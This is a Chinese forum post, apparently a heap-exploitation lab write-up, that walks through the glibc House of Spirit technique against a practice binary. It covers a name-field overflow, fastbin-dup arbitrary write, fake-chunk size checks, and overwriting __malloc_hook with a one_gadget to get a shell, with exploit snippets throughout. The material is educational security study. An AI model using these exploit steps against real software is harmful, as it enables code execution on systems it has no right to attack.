> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.52pojie.cn](https://www.52pojie.cn/thread-1547575-1-1.html)

> [md]## House of SpiritHouse of Spirit 的核心思路就是，当拥有了一个堆指针的写权限后，通过修改这个指针可以对任意 chunk 调用 `free`，进一步由这样的能力转化为任意......

 ![](https://avatar.52pojie.cn/data/avatar/001/57/34/12_avatar_middle.jpg) 呆毛王与咖喱棒

House of Spirit
---------------

House of Spirit 的核心思路就是，当拥有了一个堆指针的写权限后，通过修改这个指针可以对任意 chunk 调用`free`，进一步由这样的能力转化为任意地址写和代码执行的能力。

### 实践

首先检查一下程序的安全机制

![](https://static.hack1s.fun/images/2021/11/17/image-20211117125622753.png)

程序运行开始时给出了 libc 的地址和堆的起始地址

输入 age 和 username 两个参数后进入常规的堆菜单

这里对`malloc`函数有一个限制，申请的大小必须是 smallbins，即 0x20 到 0x3f0 之间

![](https://static.hack1s.fun/images/2021/11/17/image-20211117151719808.png)

这个程序的漏洞点在于输入 chunk name 的地方，允许输入的 name 长度是 0x10，但是`m_array`本身定义的 name 字段长度是 8，这里发生了溢出导致接下来的 ptr 可能被覆盖

![](https://static.hack1s.fun/images/2021/11/17/image-20211117170559182.png)

在 GDB 中调试一下

![](https://static.hack1s.fun/images/2021/11/17/image-20211117170724258.png)

这里写的 name 长度是 8 个字符

### 任意地址写

下面首先尝试获取到任意地址写的能力

使用我们之前已经学过的方法

既然我们能够控制堆指针，那我们就可以 free 掉一个伪造的 chunk

可以利用 [fastbin dup](https://hack1s.fun/2021/04/01/heaplab-fastbin_dup进阶/) 中使用到的方法在想要写的位置附近申请一个 chunk

![](https://static.hack1s.fun/images/2021/11/17/image-20211117202614843.png)

可以看到我们要修改的 target 上方的`0x602018`处有我们输入的`age`

如果将这个值伪造成一个 chunk 的 size

那么我们就可以利用 [fastbin dup](https://hack1s.fun/2021/04/01/heaplab-fastbin_dup进阶/) 申请这一块的区域

回忆一下，[fastbin dup](https://hack1s.fun/2021/04/01/heaplab-fastbin_dup进阶/) 需要`free`三次相同大小的 fastbin，并且之后需要`malloc`四次

```
free(a)
free(b)
free(a)

```

在这个例子中因为每次想要得到一个指针，都需要`malloc`一次，并通过溢出 name 修改指针

所以`free`三次就需要`malloc`三次

这三个指针都指向我们伪造的 chunk 中

![](https://static.hack1s.fun/images/2021/11/17/image-20211118091456807.png)

这样在一个大小为 0x200 的 chunk 中伪造了两个 0x60 大小的 chunk

利用 [fastbin dup](https://hack1s.fun/2021/04/01/heaplab-fastbin_dup进阶/) 的方法`free`三次之后可以看到 fastbin 形成了一个环

![](https://static.hack1s.fun/images/2021/11/17/image-20211118091711393.png)

接下来就是 [fastbin dup](https://hack1s.fun/2021/04/01/heaplab-fastbin_dup进阶/) 中使用的方法`malloc`四次，在我们目标的 target 附近申请一个 chunk

![](https://static.hack1s.fun/images/2021/11/17/image-20211118091900871.png)

完成之后 target 的字符串被修改为了`Much Win`

也就是说我们实现了一个任意地址写

```
age=0x61
name = b"A"*8

chunk_A = malloc(0x1f8, (p64(0)+p64(0x61)+p64(0)*10)*2, name)
chunk_B = malloc(0x68, b"Y"*0x18, name+p64(heap+0x20))
chunk_C = malloc(0x68, b"Y"*0x18, name+p64(heap+0x80))
chunk_D = malloc(0x68, b"Y"*0x18, name+p64(heap+0x20))

free(chunk_B)
free(chunk_C)
free(chunk_D)
#
malloc(0x58, p64(0x602010), name)
malloc(0x58, b'x'*18, name)
malloc(0x58, b'x'*18, name)
malloc(0x58, p64(0)*8 + b'Much Win', name)

```

但是这里存在一个问题，我们使用了 8 次`malloc`才实现这样一个效果

有没有更简单的方法呢？

不如来尝试一下直接在第一次 malloc 时就直接修改指针指向目标的 target 处

```
age = 0x6f
name = b"A"*8

chunk_A = malloc(0x18, b"Y"*0x18, name+p64(0x602010+0x10))
free(chunk_A)

```

因为栈中存储的指针是 chunk 的 user data 部分，所以覆盖的值需要加 0x10

这样运行之后在执行`free`时报错了，gdb 直接 raise 了一个 error

![](https://static.hack1s.fun/images/2021/11/17/image-20211118101013523.png)

注意到这里的 backtrace 和我们预期中不太一样，报错并不是`free`的报错

而是`munmap_chunk`函数出现了错误

![](https://static.hack1s.fun/images/2021/11/17/image-20211118101219590.png)

使用`malloc_chunk &user`可以看到这个 chunk 被解析时的标志位

其中`IS_MMAPED`是被设置了的

当一个 chunk 存在这个标志位时，申请时是通过`mmap`申请而非`malloc`申请的

同理释放时通过`unmmap`而非`free`

这就和我们预期不同了，我们希望它能够 free 之后进到 fastbin 中，方便接下来再申请过来

那么修改一下 age，从`0x6f`改为`0x61`呢？

运行时又出错了，不过这次是`free`出现的错误

切换到`_int_free`的 frame 看一下报错的原因

![](https://static.hack1s.fun/images/2021/11/17/image-20211118095014262.png)

这里报错提示的是`free(): invalid next size (fast)`

使用`list 4245`查看完整的检查内容

![](https://static.hack1s.fun/images/2021/11/17/image-20211118102130326.png)

这里检查的是`chunksize_nomask(chunk_at_offset(p,size))<=2*SIZE_SZ`以及`chunksize(chukn_at_offset(p,size))>= av->system_mem`

也就是说我们伪造的 chunk 之后的内容，是否小于`2*SIZE_SZ`或大于整个系统的内存

在我们伪造的 chunk 之后的内容正好是 0，所以不满足第一个条件

![](https://static.hack1s.fun/images/2021/11/17/image-20211118103229435.png)

这里实际上检查的是绿色方框的内容，可以注意到再后面就是 username 存储的位置

如果我们设置大小为 0x71，并且把 username 设置为一个合适的大小，或许就可以绕过这个检查了

```
age = 0x71
username = p64(0)+p64(0x20ff1)
name = b"A"*8

chunk_A = malloc(0x18, b"Y"*0x18, name+p64(0x602010+0x10))
free(chunk_A)

```

这里填的一个值是 Top chunk 的大小，这次运行没有报错

那么接下来直接 malloc 一个 0x70 大小的 chunk 就可以修改 target 的值了

```
target = malloc(0x68, p64(0)*8 + b"Much Win",name)

```

这样我们就只利用两次`malloc`实现了写的操作

![](https://static.hack1s.fun/images/2021/11/17/image-20211118104626857.png)

这种方法有几个地方需要确保：

*   Fake Size 的`IS_MAPPED`、`NON_MAIN_ARENA`、`UNUSED`位都需要清零；
*   需要能控制 fake chunk 后面的 nextsize

### 代码执行

那么接下来就是尝试将任意地址写转换成代码执行

这部分的核心思路是申请到`_malloc_hook`附近的 chunk，进而修改`_malloc_hook`

直接使用 fastbin_dup 中的方法就可以实现

![](https://static.hack1s.fun/images/2021/11/18/image-20211118134724392.png)

在 malloc_hook 附近查找有没有可以伪造的 chunk

然后直接改一下利用 fastbin dup 写的目标地址和 size

把`malloc_hook`覆盖成一个 one_gadget 的地址

![](https://static.hack1s.fun/images/2021/11/18/image-20211118140635287.png)

```
name = b"A"*8
chunk_A = malloc(0x68, b"Y"*0x18, name)
chunk_B = malloc(0x68, b"Y"*0x18, name)
chunk_C = malloc(0x68, b"Y"*0x18, name+p64(heap+0x10))

free(chunk_A)
free(chunk_B)
free(chunk_C)

malloc(0x68, p64(libc.sym.__malloc_hook - 0x23), name)
malloc(0x68, b'x'*18, name)
malloc(0x68, b'x'*18, name)
#  malloc(0x68,b'\x00'*0x13 + p64(libc.sym.system),name)
malloc(0x68, b'B'*0x13 + p64(libc.address+0xe1fa1) , name)

```

尝试了一下把`__malloc_hook`改成 system，但是发现不管用

最后还是使用 one_gadget 了

最后再调用一次`malloc`就可以获取到一个 shell

  

![](https://static.52pojie.cn/static/image/filetype/zip.gif)

[house_of_spirit.zip](forum.php?mod=attachment&aid=MjM0OTI3N3xmYzg0MjcxOHwxNjM3MzIzNTA3fDB8MTU0NzU3NQ%3D%3D)

2021-11-19 15:03 上传

点击文件名下载附件

下载积分: 吾爱币 -1 CB  

6.66 KB, 下载次数: 0, 下载积分: 吾爱币 -1 CB![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif)Dope97cc 每日膜拜前辈的经验分享 ![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif) 52wxl 膜拜大神的经验 ![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif) luckzzx 谢谢分享，膜拜大神。![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif)m94264 膜拜大神的经验